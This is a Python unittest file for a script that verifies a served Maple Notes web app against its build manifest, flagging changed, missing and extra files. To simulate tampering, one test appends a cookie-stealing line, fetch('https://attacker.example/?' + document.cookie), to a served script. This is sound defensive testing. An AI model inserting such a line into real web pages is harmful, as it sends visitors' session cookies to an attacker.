"""Tests for verify-instance.py against a local web server: a stock copy passes, a changed or extra file fails.

Run with `python3 -m unittest discover -s scripts -p "test_*.py"`. With MAPLE_DIST pointing at a built web app
(src/maple-web/dist, which holds build-manifest.json), the tests use the real build; otherwise a small stand-in.
"""

import contextlib
import functools
import hashlib
import importlib.util
import io
import json
import os
import pathlib
import shutil
import tempfile
import threading
import unittest
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer

HERE = pathlib.Path(__file__).resolve().parent
spec = importlib.util.spec_from_file_location("verify_instance", HERE / "verify-instance.py")
verify_instance = importlib.util.module_from_spec(spec)
spec.loader.exec_module(verify_instance)


def write_manifest(root):
    files = {}
    for path in sorted(root.rglob("*")):
        if path.is_file() and path.name != "build-manifest.json":
            files["/" + path.relative_to(root).as_posix()] = hashlib.sha256(path.read_bytes()).hexdigest()
    manifest = {"app": "maple-notes", "version": "9.9.9", "algorithm": "sha256", "files": files}
    (root / "build-manifest.json").write_text(json.dumps(manifest))
    return manifest


class Quiet(SimpleHTTPRequestHandler):
    def log_message(self, *args):
        pass


class VerifyInstanceTests(unittest.TestCase):
    def setUp(self):
        self.work = pathlib.Path(tempfile.mkdtemp(prefix="verify-instance-"))
        self.root = self.work / "site"
        source = os.environ.get("MAPLE_DIST")
        if source:
            shutil.copytree(source, self.root)
            self.release = json.loads((self.root / "build-manifest.json").read_text())
        else:
            (self.root / "assets").mkdir(parents=True)
            (self.root / "index.html").write_text('<script src="/assets/index-abc.js"></script>')
            (self.root / "assets" / "index-abc.js").write_text("console.log('maple')")
            (self.root / "sw.js").write_text("self.addEventListener('fetch', () => {})")
            self.release = write_manifest(self.root)
        self.manifest_file = self.work / "release.json"
        self.manifest_file.write_text(json.dumps(self.release))
        self.server = ThreadingHTTPServer(("127.0.0.1", 0), functools.partial(Quiet, directory=str(self.root)))
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        self.url = f"http://127.0.0.1:{self.server.server_address[1]}"

    def tearDown(self):
        self.server.shutdown()
        self.server.server_close()
        shutil.rmtree(self.work, ignore_errors=True)

    def run_script(self):
        out = io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(out):
            status = verify_instance.main([self.url, "--manifest", str(self.manifest_file)])
        return status, out.getvalue()

    def test_a_stock_instance_passes(self):
        status, output = self.run_script()
        self.assertEqual(status, 0, output)
        self.assertIn(f"OK: all {len(self.release['files'])} files match", output)

    def test_a_changed_file_fails(self):
        script = next(path for path in sorted(self.release["files"]) if path.endswith(".js"))
        target = self.root / script.lstrip("/")
        target.write_bytes(target.read_bytes() + b"\nfetch('https://attacker.example/?' + document.cookie)")
        status, output = self.run_script()
        self.assertEqual(status, 1, output)
        self.assertIn(f"CHANGED  {script}", output)

    def test_a_missing_file_fails(self):
        path = sorted(self.release["files"])[0]
        (self.root / path.lstrip("/")).unlink()
        status, output = self.run_script()
        self.assertEqual(status, 1, output)
        self.assertIn(f"MISSING  {path} (HTTP 404)", output)

    def test_a_file_the_release_does_not_list_fails(self):
        served = json.loads((self.root / "build-manifest.json").read_text())
        served["files"]["/assets/extra.js"] = "0" * 64
        (self.root / "build-manifest.json").write_text(json.dumps(served))
        status, output = self.run_script()
        self.assertEqual(status, 1, output)
        self.assertIn("EXTRA    /assets/extra.js", output)

    def test_a_file_that_is_not_a_manifest_is_refused(self):
        self.manifest_file.write_text(json.dumps({"files": {}}))
        status, output = self.run_script()
        self.assertEqual(status, 2, output)
        self.assertIn("is not a Maple Notes build manifest", output)


if __name__ == "__main__":
    unittest.main()
